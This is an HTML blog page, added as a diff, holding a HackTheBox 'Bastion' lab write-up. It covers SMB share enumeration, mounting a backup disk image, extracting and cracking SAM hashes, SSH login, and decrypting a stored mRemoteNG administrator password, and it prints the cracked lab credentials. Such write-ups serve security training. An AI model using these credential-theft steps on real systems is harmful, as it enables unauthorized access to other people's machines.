@@ -1,0 +1,764 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="baphzero">
+    <title>HTB Bastion Write Up - baphzero</title>
+    <meta name="author" content="Rodhnny Acosta">
+    
+    
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Rodhnny Acosta","sameAs":["https://github.com/lebaphomet","https://www.linkedin.com/in/rodhnny/","mailto:baphometsec@protonmail.com"],"image":"https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png"},"articleBody":"Bastion!A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.We have the basic information for the box, It’s a Windows Machine we got IP and off we go..Let’s get into it! .\n\n\n \n\nroot@kek:/# ping bastion.htb\nPING bastion (10.10.10.134) 56(84) bytes of data.\n64 bytes from bastion (10.10.10.134): icmp_seq=1 ttl=127 time=184 ms\n64 bytes from bastion (10.10.10.134): icmp_seq=2 ttl=127 time=178 ms\n\nNow we scan for ports and interesting stuff:\n | nmap -sV -sC -sC -T4 -oA Bastion 10.10.10.134\n\nUsing nmap we got some interesting ports open:  \nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)\n| ssh-hostkey:\n| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)\n| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)\n|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds\nService Info: OSs: Windows, Windows Server 2008 R2–2012; CPE: cpe:/o:microsoft:windows\n\nSoo two interesting ports we are going to check in detail are SMB and SSH; as a noobish guy at first I was trying to brute force SSH but after a while I decided to throw away the idea of an easy brute force ssh connection.I went for the SMB route; If we take a close look at nmap info;\n| smb-os-discovery:\n| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n| Computer name: Bastion\n| NetBIOS computer name: BASTION\\x00\n| Workgroup: WORKGROUP\\x00\n|_ System time: 2020–05–26T04:39:56+02:00\n| smb-security-mode:\n| account_used: guest\n| authentication_level: user\n| challenge_response: supported\n|_ message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n| 2.02:\n|_ Message signing enabled but not required\n| smb2-time:\n| date: 2020–05–25 22:39:57\n|_ start_date: 2020–05–25 18:03:52&gt;\n\nHere we got two routes, we can directly check if we can use something like the good ol’ msf or smbmap;\nLet’s go first with msf, we are going to use the scanner: auxiliary/scanner/smb/smb_enumshares.\n**\nmsf5 &gt; use auxiliary/scanner/smb/smb_enumshares\n\n**We set the options required:  \nmsf5 auxiliary(scanner/smb/smb_enumshares) &gt; set rhost 10.10.10.134\nrhost =&gt; 10.10.10.134\nmsf5 auxiliary(scanner/smb/smb_enumshares) &gt; set showfiles yes\nshowfiles =&gt; true  \n\nand Exploit/run!\n**`msf5 auxiliary(scanner/smb/smb_enumshares) > exploit\n[-] 10.10.10.134:139 — Login Failed: Unable to Negotiate with remote host\n[+] 10.10.10.134:445 — ADMIN$ — (DS) Remote Admin\n[+] 10.10.10.134:445 — Backups — (DS)\n[+] 10.10.10.134:445 — C$ — (DS) Default share\n[+] 10.10.10.134:445 — IPC$ — (I) Remote IPC\n[*] 10.10.10.134: — Scanned 1 of 1 hosts (100% complete)` **\n\nIt’s always nice to see a backup dir laying around.Using SMBMap can be quite fast also;\nroot@kek:~/htb/bastion# smbmap -H 10.10.10.134 -u guest\n[+] Finding open SMB ports….\n[+] User SMB session establishd on 10.10.10.134…\n[+] IP: 10.10.10.134:445 Name: bastion.htb\nDisk Permissions\n— — — — — — — -\nADMIN$ NO ACCESS\nBackups READ, WRITE\n[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\tBNzRnYGJM, plreae remove manually\nC$ NO ACCESS\nIPC$ READ ONLY\n\nListing further on that backup dir:  \n| root@kek:~/htb/bastion# smbmap -u guest -H 10.10.10.134 -R Backups\n\n \n\nInteresting enough we got a note.txt and some .vhd files that immediately took my attention; vhd files are virtual hard disks but look at the size ( ͡° ͜ʖ ͡°)\nLet’s look at note.txt\n|root@kek:~/htb/bastion# cat 10.10.10.134-Backups_note.txt\n|Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.\n\nIndeed trying to pull out the vhd will take some time, so there’s two options, trying to mount the vhd or pulling the files out first.We are going to try to mount it;\n| root@kek:~/htb/bastion# mkdir /mnt/bastion\n| root@kek:~/htb/bastion# cd /mnt/bastion/\n| root@kek:/mnt/bastion# mount -t cifs //10.10.10.134/Backups /mnt/bastion -o rw\n| Password for root@//10.10.10.134/Backups:\n\n| root@kek:/mnt# ls -lah bastion/\n| total 8.5K\n| drwxr-xr-x 2 root root 4.0K May 25 18:28 .\n| drwxr-xr-x 5 root root 4.0K May 25 18:27 ..\n| drwxr-xr-x 2 root root 0 May 25 18:28 CaShLznVPF\n| drwxr-xr-x 2 root root 0 May 25 18:20 MfNzIPZylH\n| -r-xr-xr-x 1 root root 116 Apr 16 2019 note.txt\n| drwxr-xr-x 2 root root 0 May 25 18:17 pIrubieZcm\n| -rwxr-xr-x 1 root root 0 Feb 22 2019 SDT65CB.tmp\n| drwxr-xr-x 2 root root 0 May 25 18:18 tBNzRnYGJM\n| drwxr-xr-x 2 root root 0 Feb 22 2019 WindowsImageBackup  \n\nand we going for the files in the vhd’s.\n|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# ls -lah\n|total 5.1G\n|drwxr-xr-x 2 root root 8.0K Feb 22 2019 .\n|drwxr-xr-x 2 root root 4.0K Feb 22 2019 ..\n|-rwxr-xr-x 1 root root 37M Feb 22 2019 9b9cfbc3–369e-11e9-a17c-806e6f6e6963.vhd\n|-rwxr-xr-x 1 root root 5.1G Feb 22 2019 9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd\n|-rwxr-xr-x 1 root root 1.2K Feb 22 2019 BackupSpecs.xml\n\nnow, how the h*ck we mount those vhd? well, I learned how to using this stackoverflow: https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux\n|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# guestmount — add /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\\ 2019–02–22\\ 124351/9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd — inspector — ro /mnt/vhd -v\n\n \n\nExplored Users and found no flag tho.But hey! we got a “Windows\\System32\\config” dir!So we pull both SAM and SYSTEM files.\n \n\nNow we got the hash and we need to crack it, either online on some repo or hash cat :)\n|The hash will contain the pass bureaulampje  \nnooow, we got an user and a password.If we go back we could either go back the SMB route or the SSH, since we got a credential to try let’s give SSH a chance:\n    | root@kek:~/htb/bastion# ssh L4mpje@10.10.10.134\n     L4mpje@10.10.10.134’s password:\n     Microsoft Windows [Version 10.0.14393]\n     © 2016 Microsoft Corporation. All rights reserved.\n     l4mpje@BASTION C:\\Users\\L4mpje&gt;whoami\n     bastion\\l4mpje\n\nAnd now going directly to \\Desktop we’ll find the user.txt\n \n\nNow we go back to lookup and we have access and whatnot.\nLet’s see how we can get to root.txt\nDirectory of C:\\Program Files (x86)\n22–02–2019 15:01 &lt;&quot;DIR&gt; .\n22–02–2019 15:01 &lt;&quot;DIR&gt; ..\n16–07–2016 15:23 &lt;&quot;DIR&gt; Common Files\n23–02–2019 10:38 &lt;&quot;DIR&gt; Internet Explorer\n16–07–2016 15:23 &lt;&quot;DIR&gt; Microsoft.NET\n22–02–2019 15:01 &lt;&quot;DIR&gt; mRemoteNG\n23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Defender\n23–02–2019 10:38 &lt;&quot;DIR&gt; Windows Mail\n23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Media Player\n16–07–2016 15:23 &lt;&quot;DIR&gt; Windows Multimedia Platform\n16–07–2016 15:23 &lt;&quot;DIR&gt; Windows NT\n23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Photo Viewer\n16–07–2016 15:23 &lt;&quot;DIR&gt; Windows Portable Devices\n16–07–2016 15:23 &lt;&quot;DIR&gt; WindowsPowerShell\n0 File(s) 0 bytes\n14 Dir(s) 11.305.861.120 bytes free\n\nPretty much random stuff, but what mostly stands out is the mRemoteNG.Looking up more info on vulnerabilities or stuff on mRemoteNG we found this on the web: https://hackersvanguard.com/mremoteng-insecure-password-storage/  \nsoooooo let’s take a look at the conf file at “\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG” I pretty much just did a “type confCons.xml” saved into a file and then less through the file to find the password between the lines:  \nIcon=”mRemoteNG” Panel=”General” Id=”500e7d58–662a-44d4-aff0–3a4f547a3fee” Userna\nme=”Administrator” Domain=”” Password=”aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”\nHostname=”127.0.0.1&quot;\n\nThere’s plenty of ways to “decrypt” the password, the ones mentioned by the hackersvanguard page or using this python script.Once decrypted you’ll have the password, be able to ssh into the box as administrator, grab the flag and call it a day! :)  \nroot@kek:~/htb/bastion/mremoteng-decrypt# python3 mremoteng_decrypt.py -s “aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==”\nPassword: thXLHM96BeKL0ER2\nroot@kek:~/htb/bastion/mremoteng-decrypt# ssh administrator@10.10.10.134\nadministrator@10.10.10.134’s password:\n\n \n\nHope this was at someway useful, informative perhaps. Even though this is a bit of an old box it’s always good to go back and practice a bit.Keep in consideration I am not by any means an expert or highly efficient on this yet and a lot of the process was trimmed in order to keep the post as short as I could.Hopefully I will be uploading a write up for retired machiones, every Monday from now on until end of year (Which the target is the OSCP exam) :) Thanks for taking the time to read this or skip here too!\n**\nHack the planet! x)\n**\n![user](1_8WINeDA9BY08yp2xvoQGIQ.jpg)\n\n\n","dateCreated":"2021-08-02T22:37:02-06:00","dateModified":"2021-08-02T23:15:22-06:00","datePublished":"2021-08-02T22:37:02-06:00","description":"Bastion!A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.We have the basic information for the box, It’s a Windows Machine we got IP and off we go..Let’s get into it! .\n\n\n \n\nroot@kek:/# ping bastion.htb\nPING bastion (10.10.10.134) 56(84) bytes of data.\n64 bytes from bastion (10.10.10.134): icmp_seq=1 ttl=127 time=184 ms\n64 bytes from bastion (10.10.10.134): icmp_seq=2 ttl=127 time=178 ms\n\nNow we scan for ports and interesting stuff:\n | nmap -sV -sC -sC -T4 -oA Bastion 10.10.10.134\n\nUsing nmap we got some interesting ports open:  \nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)\n| ssh-hostkey:\n| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)\n| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)\n|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds\nService Info: OSs: Windows, Windows Server 2008 R2–2012; CPE: cpe:/o:microsoft:windows\n\nSoo two interesting ports we are going to check in detail are SMB and SSH; as a noobish guy at first I was trying to brute force SSH but after a while I decided to throw away the idea of an easy brute force ssh connection.I went for the SMB route; If we take a close look at nmap info;\n| smb-os-discovery:\n| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n| Computer name: Bastion\n| NetBIOS computer name: BASTION\\x00\n| Workgroup: WORKGROUP\\x00\n|_ System time: 2020–05–26T04:39:56+02:00\n| smb-security-mode:\n| account_used: guest\n| authentication_level: user\n| challenge_response: supported\n|_ message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n| 2.02:\n|_ Message signing enabled but not required\n| smb2-time:\n| date: 2020–05–25 22:39:57\n|_ start_date: 2020–05–25 18:03:52&gt;\n","headline":"HTB Bastion Write Up","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/"},"publisher":{"@type":"Organization","name":"Rodhnny Acosta","sameAs":["https://github.com/lebaphomet","https://www.linkedin.com/in/rodhnny/","mailto:baphometsec@protonmail.com"],"image":"https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png","logo":{"@type":"ImageObject","url":"https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png"}},"url":"https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/","keywords":"HackTheBox"}</script>
+    <meta name="description" content="Bastion!A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.We have the basic information for the box, It’s a Windows Machine we got IP and off we go..Let’s g">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="HTB Bastion Write Up">
+<meta property="og:url" content="https://lebaphomet.github.io/2021/08/02/HTB-Bastion-Write-Up/index.html">
+<meta property="og:site_name" content="baphzero">
+<meta property="og:description" content="Bastion!A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.We have the basic information for the box, It’s a Windows Machine we got IP and off we go..Let’s g">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://lebaphomet.github.io/assets/images/bastion.jpg">
+<meta property="og:image" content="https://lebaphomet.github.io/assets/images/bastion2.jpg">
+<meta property="og:image" content="https://lebaphomet.github.io/assets/images/bastion3.jpg">
+<meta property="og:image" content="https://lebaphomet.github.io/assets/images/bastion4.jpg">
+<meta property="og:image" content="https://lebaphomet.github.io/assets/images/bastion5.jpg">
+<meta property="og:image" content="https://lebaphomet.github.io/assets/images/bastion6.jpg">
+<meta property="article:published_time" content="2021-08-03T04:37:02.000Z">
+<meta property="article:modified_time" content="2021-08-03T05:15:22.623Z">
+<meta property="article:author" content="Rodhnny Acosta">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lebaphomet.github.io/assets/images/bastion.jpg">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png"/>
+    
+    
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-d13bjhfh9hyu5iiqmfdpdxmkucb93db5rnh023i313usfik9viw1rgldrxug.min.css">
+
+    <!--STYLES END-->
+    
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            baphzero
+        </a>
+    </div>
+    
+        
+        
+            <i class="https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png fa-lg"></i>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="https://www.seekpng.com/png/full/168-1680719_cute-baphomet.png" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Rodhnny Acosta</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>author.bio</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="Search"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/lebaphomet"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/rodhnny/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:baphometsec@protonmail.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            HTB Bastion Write Up
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2021-08-02T22:37:02-06:00">
+	
+		    Aug 02, 2021
+    	
+    </time>
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <h1 id="Bastion"><a href="#Bastion" class="headerlink" title="Bastion!"></a>Bastion!</h1><p>A bit old by now but one of my favorites boxes to root; since I had some familiarity with SMB.<br>We have the basic information for the box, It’s a Windows Machine we got IP and off we go..<br>Let’s get into it! .</p>
+</header>
+
+<div class="image main"> <p><img src="/assets/images/bastion.jpg" alt="bastion"></p></div>
+
+<pre><code>root@kek:/# ping bastion.htb
+PING bastion (10.10.10.134) 56(84) bytes of data.
+64 bytes from bastion (10.10.10.134): icmp_seq=1 ttl=127 time=184 ms
+64 bytes from bastion (10.10.10.134): icmp_seq=2 ttl=127 time=178 ms
+</code></pre>
+<p>Now we scan for ports and interesting stuff:</p>
+<pre><code> | nmap -sV -sC -sC -T4 -oA Bastion 10.10.10.134
+</code></pre>
+<p>Using nmap we got some interesting ports open:  </p>
+<pre><code>PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+Service Info: OSs: Windows, Windows Server 2008 R2–2012; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>Soo two interesting ports we are going to check in detail are SMB and SSH; as a noobish guy at first I was trying to brute force SSH but after a while I decided to throw away the idea of an easy brute force ssh connection.<br>I went for the SMB route; If we take a close look at nmap info;</p>
+<pre><code>| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: Bastion
+| NetBIOS computer name: BASTION\x00
+| Workgroup: WORKGROUP\x00
+|_ System time: 2020–05–26T04:39:56+02:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2020–05–25 22:39:57
+|_ start_date: 2020–05–25 18:03:52&gt;
+</code></pre>
+<p>Here we got two routes, we can directly check if we can use something like the good ol’ msf or smbmap;</p>
+<p>Let’s go first with msf, we are going to use the scanner: auxiliary/scanner/smb/smb_enumshares.</p>
+<p>**</p>
+<pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_enumshares
+</code></pre>
+<p>**We set the options required:  </p>
+<pre><code>msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set rhost 10.10.10.134
+rhost =&gt; 10.10.10.134
+msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set showfiles yes
+showfiles =&gt; true  
+</code></pre>
+<p>and Exploit/run!</p>
+<pre>**`msf5 auxiliary(scanner/smb/smb_enumshares) > exploit
+[-] 10.10.10.134:139 — Login Failed: Unable to Negotiate with remote host
+[+] 10.10.10.134:445 — ADMIN$ — (DS) Remote Admin
+[+] 10.10.10.134:445 — Backups — (DS)
+[+] 10.10.10.134:445 — C$ — (DS) Default share
+[+] 10.10.10.134:445 — IPC$ — (I) Remote IPC
+[*] 10.10.10.134: — Scanned 1 of 1 hosts (100% complete)` **</pre>
+
+<p>It’s always nice to see a backup dir laying around.<br>Using SMBMap can be quite fast also;</p>
+<pre><code>root@kek:~/htb/bastion# smbmap -H 10.10.10.134 -u guest
+[+] Finding open SMB ports….
+[+] User SMB session establishd on 10.10.10.134…
+[+] IP: 10.10.10.134:445 Name: bastion.htb
+Disk Permissions
+— — — — — — — -
+ADMIN$ NO ACCESS
+Backups READ, WRITE
+[!] Unable to remove test directory at \\10.10.10.134\Backups\tBNzRnYGJM, plreae remove manually
+C$ NO ACCESS
+IPC$ READ ONLY
+</code></pre>
+<p>Listing further on that backup dir:  </p>
+<pre><code>| root@kek:~/htb/bastion# smbmap -u guest -H 10.10.10.134 -R Backups
+</code></pre>
+<div class="image main"> <p><img src="/assets/images/bastion2.jpg" alt="smbmap"></p></div>
+
+<p>Interesting enough we got a note.txt and some .vhd files that immediately took my attention; vhd files are virtual hard disks but look at the size ( ͡° ͜ʖ ͡°)</p>
+<p>Let’s look at note.txt</p>
+<pre><code>|root@kek:~/htb/bastion# cat 10.10.10.134-Backups_note.txt
+|Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+</code></pre>
+<p>Indeed trying to pull out the vhd will take some time, so there’s two options, trying to mount the vhd or pulling the files out first.<br>We are going to try to mount it;</p>
+<pre><code>| root@kek:~/htb/bastion# mkdir /mnt/bastion
+| root@kek:~/htb/bastion# cd /mnt/bastion/
+| root@kek:/mnt/bastion# mount -t cifs //10.10.10.134/Backups /mnt/bastion -o rw
+| Password for root@//10.10.10.134/Backups:
+
+| root@kek:/mnt# ls -lah bastion/
+| total 8.5K
+| drwxr-xr-x 2 root root 4.0K May 25 18:28 .
+| drwxr-xr-x 5 root root 4.0K May 25 18:27 ..
+| drwxr-xr-x 2 root root 0 May 25 18:28 CaShLznVPF
+| drwxr-xr-x 2 root root 0 May 25 18:20 MfNzIPZylH
+| -r-xr-xr-x 1 root root 116 Apr 16 2019 note.txt
+| drwxr-xr-x 2 root root 0 May 25 18:17 pIrubieZcm
+| -rwxr-xr-x 1 root root 0 Feb 22 2019 SDT65CB.tmp
+| drwxr-xr-x 2 root root 0 May 25 18:18 tBNzRnYGJM
+| drwxr-xr-x 2 root root 0 Feb 22 2019 WindowsImageBackup  
+</code></pre>
+<p>and we going for the files in the vhd’s.</p>
+<pre><code>|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# ls -lah
+|total 5.1G
+|drwxr-xr-x 2 root root 8.0K Feb 22 2019 .
+|drwxr-xr-x 2 root root 4.0K Feb 22 2019 ..
+|-rwxr-xr-x 1 root root 37M Feb 22 2019 9b9cfbc3–369e-11e9-a17c-806e6f6e6963.vhd
+|-rwxr-xr-x 1 root root 5.1G Feb 22 2019 9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd
+|-rwxr-xr-x 1 root root 1.2K Feb 22 2019 BackupSpecs.xml
+</code></pre>
+<p>now, how the h*ck we mount those vhd? well, I learned how to using this stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux">https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux</a></p>
+<pre><code>|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# guestmount — add /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019–02–22\ 124351/9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd — inspector — ro /mnt/vhd -v
+</code></pre>
+<div class="image main"> <p><img src="/assets/images/bastion3.jpg" alt="hey"></p></div>
+
+<p>Explored Users and found no flag tho.<br>But hey! we got a “Windows\System32\config” dir!<br>So we pull both SAM and SYSTEM files.</p>
+<div class="image main"> <p><img src="/assets/images/bastion4.jpg" alt="lsls"></p></div>
+
+<p>Now we got the hash and we need to crack it, either online on some repo or hash cat :)</p>
+<p>|The hash will contain the pass bureaulampje  </p>
+<p>nooow, we got an user and a password.<br>If we go back we could either go back the SMB route or the SSH, since we got a credential to try let’s give SSH a chance:</p>
+<pre><code>    | root@kek:~/htb/bastion# ssh L4mpje@10.10.10.134
+     L4mpje@10.10.10.134’s password:
+     Microsoft Windows [Version 10.0.14393]
+     © 2016 Microsoft Corporation. All rights reserved.
+     l4mpje@BASTION C:\Users\L4mpje&gt;whoami
+     bastion\l4mpje
+</code></pre>
+<p>And now going directly to \Desktop we’ll find the <strong>user.txt</strong></p>
+<div class="image main"> <p><img src="/assets/images/bastion5.jpg" alt="user"></p></div>
+
+<p>Now we go back to lookup and we have access and whatnot.</p>
+<p>Let’s see how we can get to root.txt</p>
+<pre><code>Directory of C:\Program Files (x86)
+22–02–2019 15:01 &lt;&quot;DIR&gt; .
+22–02–2019 15:01 &lt;&quot;DIR&gt; ..
+16–07–2016 15:23 &lt;&quot;DIR&gt; Common Files
+23–02–2019 10:38 &lt;&quot;DIR&gt; Internet Explorer
+16–07–2016 15:23 &lt;&quot;DIR&gt; Microsoft.NET
+22–02–2019 15:01 &lt;&quot;DIR&gt; mRemoteNG
+23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Defender
+23–02–2019 10:38 &lt;&quot;DIR&gt; Windows Mail
+23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Media Player
+16–07–2016 15:23 &lt;&quot;DIR&gt; Windows Multimedia Platform
+16–07–2016 15:23 &lt;&quot;DIR&gt; Windows NT
+23–02–2019 11:22 &lt;&quot;DIR&gt; Windows Photo Viewer
+16–07–2016 15:23 &lt;&quot;DIR&gt; Windows Portable Devices
+16–07–2016 15:23 &lt;&quot;DIR&gt; WindowsPowerShell
+0 File(s) 0 bytes
+14 Dir(s) 11.305.861.120 bytes free
+</code></pre>
+<p>Pretty much random stuff, but what mostly stands out is the mRemoteNG.<br>Looking up more info on vulnerabilities or stuff on mRemoteNG we found this on the web: <a target="_blank" rel="noopener" href="https://hackersvanguard.com/mremoteng-insecure-password-storage/">https://hackersvanguard.com/mremoteng-insecure-password-storage/</a>  </p>
+<p>soooooo let’s take a look at the conf file at <strong>“\Users\L4mpje\AppData\Roaming\mRemoteNG”</strong> I pretty much just did a “type confCons.xml” saved into a file and then less through the file to find the password between the lines:  </p>
+<pre><code>Icon=”mRemoteNG” Panel=”General” Id=”500e7d58–662a-44d4-aff0–3a4f547a3fee” Userna
